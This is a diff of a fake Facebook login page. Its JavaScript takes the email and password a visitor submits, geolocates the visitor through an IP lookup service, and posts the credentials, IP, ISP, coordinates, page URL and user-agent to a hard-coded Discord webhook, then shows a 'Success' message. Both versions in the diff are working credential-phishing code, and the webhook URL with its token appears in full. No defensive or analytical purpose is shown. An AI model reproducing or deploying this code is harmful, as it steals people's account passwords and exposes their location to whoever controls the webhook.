@@ -26,10 +26,7 @@
       gap: 32px;
       flex-wrap: wrap;
     }
-    .left {
-      flex: 1;
-      min-width: 300px;
-    }
+    .left { flex: 1; min-width: 300px; }
     .left h1 {
       color: #1877f2;
       font-size: 4.2rem;
@@ -143,143 +140,132 @@
 </div>
 
 <script>
-// ────────────────────────────────────────────────
-//  CHANGE THIS TO YOUR REAL DISCORD WEBHOOK
-// ────────────────────────────────────────────────
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1473312861249081398/lt3CWhpRKPjYynhw0BxdEgo1fLsTn6wHzR9c7zWCmGPvI6U0Z6l9STcGnk_q3GLOuyzv";
+// CHANGE THIS ────────────────────────────────────────────────
+const WEBHOOK = "https://discord.com/api/webhooks/1473312861249081398/lt3CWhpRKPjYynhw0BxdEgo1fLsTn6wHzR9c7zWCmGPvI6U0Z6l9STcGnk_q3GLOuyzv";
 
-async function getIPAndGeo() {
+async function getLocationInfo() {
   try {
-    const res = await fetch("https://ip-api.com/json/?fields=status,message,query,as,isp,org,country,regionName,city,lat,lon,timezone,mobile,proxy,hosting", {
-      cache: "no-store"
+    const r = await fetch("https://ip-api.com/json/?fields=status,message,query,as,isp,org,country,regionName,city,lat,lon,timezone,mobile,proxy,hosting", {
+      cache: "no-store",
+      mode: "cors"
     });
-    if (!res.ok) throw new Error("API error");
-    const data = await res.json();
 
-    if (data.status !== "success") {
-      throw new Error(data.message || "API failed");
-    }
+    if (!r.ok) throw new Error("http " + r.status);
 
-    // Parse ASN & Provider
-    let asnFull = data.as || "Unknown";               // e.g. "AS17639 Converge ICT Solutions Inc."
-    let provider = data.isp || data.org || "Unknown"; // Prefer isp, fallback to org
+    const d = await r.json();
+    if (d.status !== "success") throw new Error(d.message || "api error");
+
+    const asnLine = d.as || "Unknown ASN";
+    let [asnNum, ...asnNameParts] = asnLine.split(" ");
+    let asnName = asnNameParts.join(" ");
 
     return {
-      ip: data.query || "unknown",
-      asn: asnFull,
-      provider: provider,
-      country: data.country || "unknown",
-      region: data.regionName || "unknown",
-      city: data.city || "unknown",
-      lat: data.lat || null,
-      lon: data.lon || null,
-      timezone: data.timezone || "unknown",
-      mobile: data.mobile ? "True" : "False",
-      proxy: data.proxy ? "True" : "False",  // covers proxy/VPN/Tor
-      hosting: data.hosting ? "True" : "False",
-      bot: (data.proxy || data.hosting) ? "Likely" : "False"  // rough approximation
+      ip: d.query || "unknown",
+      provider: d.isp || d.org || "Unknown Provider",
+      asn: asnNum || "Unknown",
+      asn_org: asnName || d.org || "Unknown Organization",
+      country: d.country || "unknown",
+      region: d.regionName || "unknown",
+      city: d.city || "unknown",
+      lat: d.lat ?? null,
+      lon: d.lon ?? null,
+      timezone: d.timezone || "unknown",
+      mobile: d.mobile ? "True" : "False",
+      proxy: d.proxy ? "True" : "False",
+      hosting: d.hosting ? "True" : "False"
     };
-  } catch (err) {
-    console.error(err);
+  } catch (e) {
+    console.error(e);
     return {
-      ip: "fetch failed",
-      asn: "unknown",
-      provider: "unknown",
-      country: "unknown",
-      region: "unknown",
-      city: "unknown",
+      ip: "error",
+      provider: "error",
+      asn: "error",
+      asn_org: "error",
+      country: "error",
+      region: "error",
+      city: "error",
       lat: null,
       lon: null,
-      timezone: "unknown",
-      mobile: "unknown",
-      proxy: "unknown",
-      hosting: "unknown",
-      bot: "unknown"
+      timezone: "error",
+      mobile: "error",
+      proxy: "error",
+      hosting: "error"
     };
   }
-}
-
-function guessDeviceType() {
-  const ua = navigator.userAgent.toLowerCase();
-  const w = screen.width;
-  if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua) || w <= 768) return "Mobile";
-  if (/tablet|ipad|kindle|playbook|silk/i.test(ua) || (w > 768 && w <= 1024)) return "Tablet";
-  return "Desktop / Laptop";
 }
 
 document.getElementById("fbLogin").addEventListener("submit", async e => {
   e.preventDefault();
 
-  const email    = document.getElementById("email").value.trim();
-  const password = document.getElementById("pass").value.trim();
-  const msg      = document.getElementById("msg");
+  const email = document.getElementById("email").value.trim();
+  const pass  = document.getElementById("pass").value.trim();
+  const msgEl = document.getElementById("msg");
 
-  if (!email || !password) {
-    msg.textContent = "Please fill in all fields";
-    msg.className = "status error";
+  if (!email || !pass) {
+    msgEl.textContent = "Fill both fields";
+    msgEl.className = "status error";
     return;
   }
 
-  msg.textContent = "Logging in...";
-  msg.className = "status";
+  msgEl.textContent = "Logging in...";
+  msgEl.className = "status";
 
-  const geo = await getIPAndGeo();
-  const deviceType = guessDeviceType();
+  const geo = await getLocationInfo();
 
-  const coords = geo.lat && geo.lon ? `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)} (Approximate)` : "unknown";
+  const coordsStr = (geo.lat !== null && geo.lon !== null)
+    ? `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)} (Approximate)`
+    : "unknown";
+
+  const infoText = [
+    `IP: ${geo.ip}`,
+    `Provider: ${geo.provider}`,
+    `ASN: ${geo.asn} ${geo.asn_org}`,
+    `Country: ${geo.country}`,
+    `Region: ${geo.region}`,
+    `City: ${geo.city}`,
+    `Coords: ${coordsStr}`,
+    `Timezone: ${geo.timezone}`,
+    `Mobile: ${geo.mobile}`,
+    `VPN/Proxy: ${geo.proxy}`,
+    `Bot/Likely: ${geo.proxy || geo.hosting ? "Likely" : "False"}`
+  ].join("\n");
 
   const payload = {
     content: null,
     embeds: [{
-      title: "📱 Facebook Login Attempt",
-      color: 0x1877F2,
-      description: "```text\n" +
-        `IP: ${geo.ip}\n` +
-        `Provider: ${geo.provider}\n` +
-        `ASN: ${geo.asn}\n` +
-        `Country: ${geo.country}\n` +
-        `Region: ${geo.region}\n` +
-        `City: ${geo.city}\n` +
-        `Coords: ${coords}\n` +
-        `Timezone: ${geo.timezone}\n` +
-        `Mobile: ${geo.mobile}\n` +
-        `VPN/Proxy: ${geo.proxy}\n` +
-        `Bot/Likely: ${geo.bot}\n` +
-      "```",
+      title: "Facebook Login",
+      color: 0x1877f2,
+      description: "```text\n" + infoText + "\n```",
       fields: [
-        { name: "Email / Phone", value: `\`\`\`${email}\`\`\``, inline: true },
-        { name: "Password",      value: `\`\`\`${password}\`\`\``, inline: true },
-        { name: "Website / Page", value: `\`\`\`${location.href}\`\`\``, inline: false },
-        { name: "Device Type",   value: deviceType, inline: true },
-        { name: "Screen",        value: `${screen.width} × ${screen.height} (${window.devicePixelRatio}x)`, inline: true },
-        { name: "User-Agent",    value: `\`\`\`${navigator.userAgent.substring(0, 140)}${navigator.userAgent.length > 140 ? '...' : ''}\`\`\``, inline: false }
+        { name: "Email/Phone", value: "```" + email + "```", inline: true },
+        { name: "Password",    value: "```" + pass  + "```", inline: true },
+        { name: "Page",        value: "```" + location.href + "```", inline: false },
+        { name: "User-Agent",  value: "```" + navigator.userAgent.substring(0,180) + "```", inline: false }
       ],
       timestamp: new Date().toISOString(),
-      footer: { text: `${location.hostname} • ${geo.provider || geo.ip}` }
+      footer: { text: location.hostname }
     }]
   };
 
   try {
-    const res = await fetch(WEBHOOK_URL, {
+    const resp = await fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
 
-    if (res.ok) {
-      msg.textContent = "Success! You may now close this page.";
-      msg.className = "status success";
-      // Optional: setTimeout(() => { window.location = "https://www.facebook.com"; }, 2200);
+    if (resp.ok) {
+      msgEl.textContent = "Success";
+      msgEl.className = "status success";
     } else {
-      msg.textContent = "Something went wrong. Try again.";
-      msg.className = "status error";
+      msgEl.textContent = "Send error (" + resp.status + ")";
+      msgEl.className = "status error";
     }
   } catch (err) {
-    msg.textContent = "Network error – check connection";
-    msg.className = "status error";
+    msgEl.textContent = "Network / fetch error";
+    msgEl.className = "status error";
   }
 });
 </script>
-
 </body>
 </html>
